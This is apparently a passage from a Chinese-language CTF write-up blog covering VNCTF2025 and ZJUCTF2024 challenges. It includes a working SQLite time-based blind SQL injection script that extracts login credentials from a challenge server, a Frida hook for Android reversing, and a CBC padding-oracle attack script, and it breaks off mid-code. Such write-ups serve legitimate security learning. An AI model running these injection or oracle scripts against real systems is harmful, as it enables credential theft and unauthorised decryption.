1=1#</code>起手，首先题目过滤了空格用<code>/**/</code>绕过，发现可以单引号闭合即有注入可能，不能使用<code>sleep</code>等函数；</li><li>一开始还是受思维定式影响一直以为是MYSQL的注入，但是使用<code>' or if(1,1,0)--</code>和<code>' or (database() like '%')--</code>数据库会报错，执行<code>' or sqlite_version()--</code>成功才意识到作者使用的是sqlite数据库，在这卡了半天🫠</li><li>sqlite注入使用<code>randomblob(300000000)</code>代替<code>sleep(1)</code>，使用<code>case</code>语句进行判断便可执行时间盲注，脚本如下： <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> json<br><span class="hljs-keyword">import</span> time<br><br>url = <span class="hljs-string">&quot;http://node.vnteam.cn:47161/login&quot;</span><br>test = <span class="hljs-string">&#x27;0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz!&quot;#$%&amp;\&#x27;()*+,-./:;&lt;=&gt;?@[\\]^_`&#123;|&#125;~&#x27;</span><br><br>username = <span class="hljs-string">&quot;nailong&quot;</span><br>password = <span class="hljs-string">&quot;&quot;</span><br>idx = <span class="hljs-built_in">len</span>(password)+<span class="hljs-number">1</span><br><span class="hljs-keyword">while</span> <span class="hljs-number">1</span>:<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(test)):<br>        time1 = time.time()<br>        <span class="hljs-comment"># payload = f&quot;substr((select/**/username/**/from/**/users),&#123;idx&#125;,1)&lt;&#x27;&#123;test[i]&#125;&#x27;&quot;</span><br>        payload = <span class="hljs-string">f&quot;substr((select/**/password/**/from/**/users),<span class="hljs-subst">&#123;idx&#125;</span>,1)&lt;&#x27;<span class="hljs-subst">&#123;test[i]&#125;</span>&#x27;&quot;</span><br>        data = &#123;<br>            <span class="hljs-string">&#x27;username&#x27;</span>: <span class="hljs-string">f&quot;&#x27;/**/or/**/case/**/when/**/<span class="hljs-subst">&#123;payload&#125;</span>/**/then/**/randomblob(300000000)/**/else/**/0/**/end--&quot;</span>,<br>            <span class="hljs-string">&#x27;password&#x27;</span>: <span class="hljs-string">&quot;&#x27;1&quot;</span><br>        &#125;<br>        headers = &#123;<br>            <span class="hljs-string">&#x27;Content-Type&#x27;</span>: <span class="hljs-string">&#x27;application/json&#x27;</span><br>        &#125;<br>        response = requests.post(url, headers=headers, data=json.dumps(data))<br>        time2 = time.time()<br><br>        <span class="hljs-comment"># print(json.loads(response.text))</span><br>        <span class="hljs-comment"># print(i,time2-time1)</span><br>        <span class="hljs-keyword">if</span> json.loads(response.text)[<span class="hljs-string">&#x27;message&#x27;</span>]!=<span class="hljs-string">&#x27;账号或密码错误！！&#x27;</span>:<br>            <span class="hljs-built_in">print</span>(json.loads(response.text))<br>            exit()<br>        <span class="hljs-keyword">if</span> time2-time1&gt;<span class="hljs-number">0.5</span>:<br>            <span class="hljs-keyword">if</span> i!=<span class="hljs-number">0</span>:<br>                password+=test[i-<span class="hljs-number">1</span>]<br>            <span class="hljs-keyword">else</span>:<br>                exit()<br>            <span class="hljs-built_in">print</span>(password)<br>            <span class="hljs-keyword">break</span><br>        time.sleep(<span class="hljs-number">0.4</span>)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">break</span><br>    idx+=<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure> <img src="/img/VNCTF2025/VNCTF2025_9.png" alt="alt text" /></li><li>得到用户名密码后提交得到跳转网页进行访问： <img src="/img/VNCTF2025/VNCTF2025_10.png" alt="alt text" /> <img src="/img/VNCTF2025/VNCTF2025_11.png" alt="alt text" /></li></ul><h1 id="pwn"><strong>Pwn</strong></h1><div class="note note-danger">            <p>不会pwn一点！</p>          </div><h1 id="misc"><strong>Misc</strong></h1><p>只会一道简单的，其他的都好难😶</p><h2 id="vn_lang">VN_Lang</h2><ul><li>提供了一个将文字转化成特定符号的脚本，一开始还以为是打表，但是代码没提供模板，于是用ida打开程序搜索字符串<code>VNCTF</code>得到flag： <img src="/img/VNCTF2025/VNCTF2025_12.png" alt="alt text" /></li></ul><h1 id="reverse"><strong>Reverse</strong></h1><p>好多apk逆向题目。。。</p><h2 id="hook-fish">Hook Fish</h2><ul><li>使用jadx工具逆向apk文件，审计代码： <img src="/img/VNCTF2025/VNCTF2025_13.png" alt="alt text" /></li><li>代码逻辑是获取一段口令并进行加密，再在某个神奇的url地址下载<code>hook_fish.dex</code>并载入其中的加密和检查方法；</li><li>使用frida连接并hook出url地址，下载得到文件： <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-title class_">Java</span>.<span class="hljs-title function_">perform</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">var</span> <span class="hljs-title class_">MainActivity</span> = <span class="hljs-title class_">Java</span>.<span class="hljs-title function_">use</span>(<span class="hljs-string">&quot;com.example.hihitt.MainActivity&quot;</span>);<br>    <br>    <span class="hljs-title class_">MainActivity</span>.<span class="hljs-property">fish</span>.<span class="hljs-property">implementation</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params">str</span>) &#123;<br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;[*] url input: &quot;</span> + str);<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">fish</span>(str);<br>    &#125;;<br>    <br>&#125;);<br></code></pre></td></tr></table></figure> <img src="/img/VNCTF2025/VNCTF2025_14.png" alt="alt text" /></li><li>继续反编译<code>hook_fish.dex</code>文件，满足检查条件两次解密得到口令： <img src="/img/VNCTF2025/VNCTF2025_15.png" alt="alt text" /> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs python">fish_dcode = &#123;<br>    <span class="hljs-string">&quot;iiijj&quot;</span>: <span class="hljs-string">&#x27;a&#x27;</span>, <span class="hljs-string">&quot;jjjii&quot;</span>: <span class="hljs-string">&#x27;b&#x27;</span>, <span class="hljs-string">&quot;jijij&quot;</span>: <span class="hljs-string">&#x27;c&#x27;</span>, <span class="hljs-string">&quot;jjijj&quot;</span>: <span class="hljs-string">&#x27;d&#x27;</span>, <span class="hljs-string">&quot;jjjjj&quot;</span>: <span class="hljs-string">&#x27;e&#x27;</span>, <span class="hljs-string">&quot;ijjjj&quot;</span>: <span class="hljs-string">&#x27;f&#x27;</span>, <span class="hljs-string">&quot;jjjji&quot;</span>: <span class="hljs-string">&#x27;g&#x27;</span>,<br>    <span class="hljs-string">&quot;iijii&quot;</span>: <span class="hljs-string">&#x27;h&#x27;</span>, <span class="hljs-string">&quot;ijiji&quot;</span>: <span class="hljs-string">&#x27;i&#x27;</span>, <span class="hljs-string">&quot;iiiji&quot;</span>: <span class="hljs-string">&#x27;j&#x27;</span>, <span class="hljs-string">&quot;jjjij&quot;</span>: <span class="hljs-string">&#x27;k&#x27;</span>, <span class="hljs-string">&quot;jijji&quot;</span>: <span class="hljs-string">&#x27;l&#x27;</span>, <span class="hljs-string">&quot;ijiij&quot;</span>: <span class="hljs-string">&#x27;m&#x27;</span>, <span class="hljs-string">&quot;iijji&quot;</span>: <span class="hljs-string">&#x27;n&#x27;</span>,<br>    <span class="hljs-string">&quot;ijjij&quot;</span>: <span class="hljs-string">&#x27;o&#x27;</span>, <span class="hljs-string">&quot;jiiji&quot;</span>: <span class="hljs-string">&#x27;p&#x27;</span>, <span class="hljs-string">&quot;ijijj&quot;</span>: <span class="hljs-string">&#x27;q&#x27;</span>, <span class="hljs-string">&quot;jijii&quot;</span>: <span class="hljs-string">&#x27;r&#x27;</span>, <span class="hljs-string">&quot;iiiii&quot;</span>: <span class="hljs-string">&#x27;s&#x27;</span>, <span class="hljs-string">&quot;jjiij&quot;</span>: <span class="hljs-string">&#x27;t&#x27;</span>, <span class="hljs-string">&quot;ijjji&quot;</span>: <span class="hljs-string">&#x27;u&#x27;</span>,<br>    <span class="hljs-string">&quot;jiiij&quot;</span>: <span class="hljs-string">&#x27;v&#x27;</span>, <span class="hljs-string">&quot;iiiij&quot;</span>: <span class="hljs-string">&#x27;w&#x27;</span>, <span class="hljs-string">&quot;iijij&quot;</span>: <span class="hljs-string">&#x27;x&#x27;</span>, <span class="hljs-string">&quot;jjiji&quot;</span>: <span class="hljs-string">&#x27;y&#x27;</span>, <span class="hljs-string">&quot;jijjj&quot;</span>: <span class="hljs-string">&#x27;z&#x27;</span>, <span class="hljs-string">&quot;iijjl&quot;</span>: <span class="hljs-string">&#x27;1&#x27;</span>, <span class="hljs-string">&quot;iiilj&quot;</span>: <span class="hljs-string">&#x27;2&#x27;</span>,<br>    <span class="hljs-string">&quot;iliii&quot;</span>: <span class="hljs-string">&#x27;3&#x27;</span>, <span class="hljs-string">&quot;jiili&quot;</span>: <span class="hljs-string">&#x27;4&#x27;</span>, <span class="hljs-string">&quot;jilji&quot;</span>: <span class="hljs-string">&#x27;5&#x27;</span>, <span class="hljs-string">&quot;iliji&quot;</span>: <span class="hljs-string">&#x27;6&#x27;</span>, <span class="hljs-string">&quot;jjjlj&quot;</span>: <span class="hljs-string">&#x27;7&#x27;</span>, <span class="hljs-string">&quot;ijljj&quot;</span>: <span class="hljs-string">&#x27;8&#x27;</span>, <span class="hljs-string">&quot;iljji&quot;</span>: <span class="hljs-string">&#x27;9&#x27;</span>,<br>    <span class="hljs-string">&quot;jjjli&quot;</span>: <span class="hljs-string">&#x27;0&#x27;</span><br>&#125;<br><br>encrypted_str = <span class="hljs-string">&quot;jjjliijijjjjjijiiiiijijiijjiijijjjiiiiijjjjliiijijjjjljjiilijijiiiiiljiijjiiliiiiiiiiiiiljiijijiliiiijjijijjijijijijiilijiijiiiiiijiljijiilijijiiiijjljjjljiliiijjjijiiiljijjijiiiiiiijjliiiljjijiiiliiiiiiljjiijiijiijijijjiijjiijjjijjjljiliiijijiiiijjliijiijiiliiliiiiiiljiijjiiliiijjjliiijjljjiijiiiijiijjiijijjjiiliiliiijiijijijiijijiiijjjiijjijiiiljiijiijilji&quot;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decode</span>(<span class="hljs-params">encrypted_str</span>):<br>    decoded_str = []<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(encrypted_str), <span class="hljs-number">5</span>):<br>        chunk = encrypted_str[i:i+<span class="hljs-number">5</span>]<br>        <span class="hljs-keyword">if</span> chunk <span class="hljs-keyword">in</span> fish_dcode:<br>            decoded_str.append(fish_dcode[chunk])<br>        <span class="hljs-keyword">else</span>:<br>            decoded_str.append(<span class="hljs-string">&#x27;?&#x27;</span>)<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&#x27;</span>.join(decoded_str)<br><br>cipher = decode(encrypted_str)<br>tmp = <span class="hljs-string">&quot;&quot;</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(cipher)):<br>    tmp1 = <span class="hljs-built_in">ord</span>(cipher[i])-i%<span class="hljs-number">10</span>-<span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;7&#x27;</span>)<br>    tmp2 = <span class="hljs-built_in">ord</span>(cipher[i])-i%<span class="hljs-number">4</span>+<span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;1&#x27;</span>)<br>    <span class="hljs-comment"># print(tmp1,tmp2)</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">ord</span>(<span class="hljs-string">&quot;a&quot;</span>)&lt;=tmp2&lt;=<span class="hljs-built_in">ord</span>(<span class="hljs-string">&quot;f&quot;</span>):<br>        tmp += <span class="hljs-built_in">chr</span>(tmp2)<br>    <span class="hljs-keyword">else</span>:<br>        tmp += <span class="hljs-built_in">chr</span>(tmp1)<br><br>newtmp = <span class="hljs-string">&quot;&quot;</span>.join(tmp[i+<span class="hljs-number">1</span>]+tmp[i] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(tmp),<span class="hljs-number">2</span>))<br>key = <span class="hljs-string">&quot;&quot;</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(newtmp),<span class="hljs-number">2</span>):<br>    key+=<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(newtmp[i:i+<span class="hljs-number">2</span>],<span class="hljs-number">16</span>)-<span class="hljs-number">68</span>)<br><span class="hljs-built_in">print</span>(key)<br><span class="hljs-comment"># VNCTF&#123;u_re4l1y_kn0w_H0Ok_my_f1Sh!1l&#125;</span><br></code></pre></td></tr></table></figure></li></ul><h1 id="总结"><strong>总结</strong></h1><p>感觉一天时间还是太少了，很多apk逆向和web题目还没仔细看，可能还是太菜了（雾），不过也是惊险挤进前十，最后签退都忘记做了🙃</p><figure><img src="/img/VNCTF2025/VNCTF2025_16.png" alt="" /><figcaption>Final Score</figcaption></figure>]]></content>
    
    
    <categories>
      
      <category>CTF writeup</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ZJUCTF2024 writeup</title>
    <link href="/2025/01/17/ZJUCTF2024wp/"/>
    <url>/2025/01/17/ZJUCTF2024wp/</url>
    
    <content type="html"><![CDATA[<p>比赛时间是2024年的10月15日至22日，对于一场个人赛来说时间还是很充裕的😋</p><h1 id="crypto"><strong>Crypto</strong></h1><p>这次的密码学竟然没有RSA题目🤨</p><h2 id="ezxor">ezxor</h2><ul><li>一个异或复原题目，但是在程序最后随机改了20个位置；</li><li>考虑忽略最后的修改直接通过异或复原： <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python">realcipher = <span class="hljs-string">&#xx27;</span><br>cipher = realcipher<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(cipher)-<span class="hljs-number">1</span>,-<span class="hljs-number">1</span>,-<span class="hljs-number">1</span>):<br>    tmp = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(cipher)-<span class="hljs-number">1</span>,i-<span class="hljs-number">1</span>,-<span class="hljs-number">1</span>):<br>        tmp^= <span class="hljs-built_in">int</span>(cipher[j])<br>    cipher = cipher[:i]+<span class="hljs-built_in">str</span>(tmp)+cipher[i+<span class="hljs-number">1</span>:]<br>cipher = <span class="hljs-string">&quot;0&quot;</span>+cipher[:-<span class="hljs-number">1</span>]<br><span class="hljs-comment"># print(cipher)</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(cipher),<span class="hljs-number">8</span>):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(cipher[i:i+<span class="hljs-number">8</span>],<span class="hljs-number">2</span>)),end=<span class="hljs-string">&quot;&quot;</span>)<br></code></pre></td></tr></table></figure></li><li>跑出来flag是这玩意:<code>[ÊUCF&#123;Tell_do&gt;e!_Wel£¯me_to_YJUCTF_2&lt;24!&#125;</code>，根据题目提示猜测flag是<code>ZJUCTF&#123;Well_done!_Welcome_to_ZJUCTF_2024!&#125;</code>，验证正确；</li></ul><h2 id="easypad">easypad</h2><ul><li>一个简单的CBC的padding填充漏洞，可以根据控制IV来控制解密结果是否符合pad得到原文，写了个恢复原文的脚本: <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES<br><span class="hljs-keyword">from</span> Crypto.Util.Padding <span class="hljs-keyword">import</span> pad, unpad<br><span class="hljs-keyword">from</span> os <span class="hljs-keyword">import</span> urandom<br><span class="hljs-keyword">import</span> random<br><br>KEY = urandom(<span class="hljs-number">16</span>)<br>random.seed(KEY)<br>message = urandom(<span class="hljs-number">16</span>).<span class="hljs-built_in">hex</span>()<br><span class="hljs-built_in">print</span>(message)<br><br><span class="hljs-comment"># pad = lambda msg: msg + (chr(pad_length) * (16 - len(msg) % 16)).encode()</span><br>unpad = <span class="hljs-keyword">lambda</span> msg: <span class="hljs-built_in">bytes</span>([msg[-<span class="hljs-number">1</span>]]) * msg[-<span class="hljs-number">1</span>] == msg[-msg[-<span class="hljs-number">1</span>]:]<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">encrypt</span>(<span class="hljs-params">msg: <span class="hljs-built_in">bytes</span></span>):<br>    IV = urandom(<span class="hljs-number">16</span>)<br>    cipher = AES.new(KEY, AES.MODE_CBC, IV)<br>    encrypted = cipher.encrypt(msg)<br>    <span class="hljs-keyword">return</span> IV + encrypted<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decrypt</span>(<span class="hljs-params">msg: <span class="hljs-built_in">bytes</span></span>):<br>    IV = msg[:<span class="hljs-number">16</span>]<br>    cipher = AES.new(KEY, AES.MODE_CBC, IV)<br>    decrypted = cipher.decrypt(msg[<span class="hljs-number">16</span>:])<br>    <span class="hljs-comment"># print(decrypted)</span><br>    <span class="hljs-keyword">return</span> unpad(decrypted)<br><br>cipher = encrypt(message.encode()).<span class="hljs-built_in">hex</span>()<br><span class="hljs-built_in">print</span>(cipher)<br>cipher = <span class="hljs-built_in">bytes</span>.fromhex(cipher)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">len</span>(cipher))<br>IV,E1,E2 = cipher[:<span class="hljs-number">16</span>],cipher[<span class="hljs-number">16</span>:<span class="hljs-number">32</span>],cipher[<span class="hljs-number">32</span>:]<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">senddecrypt</span>(<span class="hljs-params">text</span>):<br>    <span class="hljs-keyword">global</span> io<br>    io.recv()<br>    io.sendline(<span class="hljs-string">b&quot;1&quot;</span>)<br>    io.recv()<br>    io.sendline(text)<br>    res = io.recvline()[:-<span class="hljs-number">1</span>]<br>    <span class="hljs-keyword">return</span> res<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">hexstr</span>(<span class="hljs-params">i</span>):<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">len</span>(<span class="hljs-built_in">hex</span>(i)[<span class="hljs-number">2</span>:])==<span class="hljs-number">1</span>):<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;0&quot;</span>+<span class="hljs-built_in">hex</span>(i)[<span class="hljs-number">2</span>:]<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">hex</span>(i)[<span class="hljs-number">2</span>:]<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">part</span>(<span class="hljs-params">E,E_pre</span>):<br>    ans = <span class="hljs-string">&quot;&quot;</span><br>    temp = [<span class="hljs-string">&quot;00&quot;</span>]*<span class="hljs-number">16</span><br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">15</span>,-<span class="hljs-number">1</span>,-<span class="hljs-number">1</span>):<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-string">&quot;0123456789abcdef&quot;</span>:<br>            temp[j] = hexstr(E_pre[j]^(<span class="hljs-number">16</span>-j)^<span class="hljs-built_in">ord</span>(i))<br>            tmp = <span class="hljs-number">1</span><br>            Ct = <span class="hljs-string">&quot;&quot;</span>.join(temp)<br>            <span class="hljs-keyword">assert</span> <span class="hljs-built_in">len</span>(Ct)==<span class="hljs-number">32</span><br>            payload = Ct+E.<span class="hljs-built_in">hex</span>()<br>            <span class="hljs-keyword">for</span> t <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">50</span>):<br>                res = decrypt(<span class="hljs-built_in">bytes</span>.fromhex(payload))<br>                <span class="hljs-comment"># print(res)</span><br>                <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> res:<br>                    tmp = <span class="hljs-number">0</span><br>                    <span class="hljs-keyword">break</span><br>            <span class="hljs-keyword">if</span> tmp:<br>                ans = i+ans<br>                <span class="hljs-keyword">for</span> z <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">15</span>,j-<span class="hljs-number">1</span>,-<span class="hljs-number">1</span>):<br>                    temp[z] = hexstr(<span class="hljs-built_in">int</span>(temp[z],<span class="hljs-number">16</span>)^(<span class="hljs-number">16</span>-j)^(<span class="hljs-number">17</span>-j))<br>                <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">else</span>:<br>            exit()<br>    <span class="hljs-keyword">return</span> ans<br><br>msg1 = part(E1,IV)<br>msg2 = part(E2,E1)<br>message = msg1+msg2<br><span class="hljs-built_in">print</span>(message)<br></code></pre></td></tr></table></figure></li><li>但是注意到题目返回结果是<code>unpad(decrypted) ^ (random.random() &gt; 0.1)</code>，那就多次请求来看看概率分布就可以判断了： <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.log_level = <span class="hljs-string">&quot;debug&quot;</span><br><br>io = remote(<span class="hljs-string">&quot;127.0.0.1&quot;</span>,<span class="hljs-number">51245</span>)<br>cipher = io.recvline()[:-<span class="hljs-number">1</span>].decode(<span class="hljs-string">&quot;utf-8&quot;</span>)<br>cipher = <span class="hljs-built_in">bytes</span>.fromhex(cipher)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">len</span>(cipher))<br>IV,E1,E2 = cipher[:<span class="hljs-number">16</span>],cipher[<span class="hljs-number">16</span>:<span class="hljs-number">32</span>],cipher[<span class="hljs-number">32</span>:]<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">senddecrypt</span>(<span class="hljs-params">text</span>):<br>    <span class="hljs-keyword">global</span> io<br>    io.recv()<br>    io.sendline(<span class="hljs-string">b&quot;1&quot;</span>)<br>    io.recv()<br>    io.sendline(text)<br>    res = io.recvline()[:-<span class="hljs-number">1</span>]<br>    <span class="hljs-keyword">return</span> res<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">hexstr</span>(<span class="hljs-params">i</span>):<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">len</span>(<span class="hljs-built_in">hex</span>(i)[<span class="hljs-number">2</span>:])==<span class="hljs-number">1</span>):<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;0&quot;</span>+<span class="hljs-built_in">hex</span>(i)[<span class="hljs-number">2</span>:]<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">hex</span>(i)[<span class="hljs-number">2</span>:]<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">part</span>(<span class="hljs-params">E,E_pre</span>):<br>    ans = <span class="hljs-string">&quot;&quot;</span><br>    temp = [<span class="hljs-string">&quot;00&quot;</span>]*<span class="hljs-number">16</span><br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">15</span>,-<span class="hljs-number">1</span>,-<span class="hljs-number">1</span>):<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-string">&quot;0123456789abcdef&quot;</span>:<br>            temp[j] = hexstr(E_pre[j]^(<span class="hljs-number">16</span>-j)^<span class="hljs-built_in">ord</span>(i))<br>            tmp = <span class="hljs-number">1</span><br>            Ct = <span class="hljs-string">&quot;&quot;</span>.join(temp)<br>            <span class="hljs-keyword">assert</span> <span class="hljs-built_in">len</span>(Ct)==<span class="hljs-number">32</span><br>            payload = Ct+E.<span class="hljs-built_in">hex</span>()<br>            times = &#123;<span class="hljs-string">b&quot;False&quot;</span>:<span class="hljs-number">0</span>,<span class="hljs-string">b&quot;True&quot;</span>:<span class="hljs-number">0</span>&#125;<br>            <span class="hljs-keyword">for</span> t <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">20</span>):<br>                res = senddecrypt(payload)<br>                times[res] += <span class="hljs-number">1</span> <br>            <span class="hljs-keyword">if</span> times[<span class="hljs-string">b&quot;False&quot;</span>] &gt; times[<span class="hljs-string">b&quot;True&quot;</span>]*<span class="hljs-number">2</span>:<br>                ans = i+ans<br>                <span class="hljs-keyword">for</span> z <span 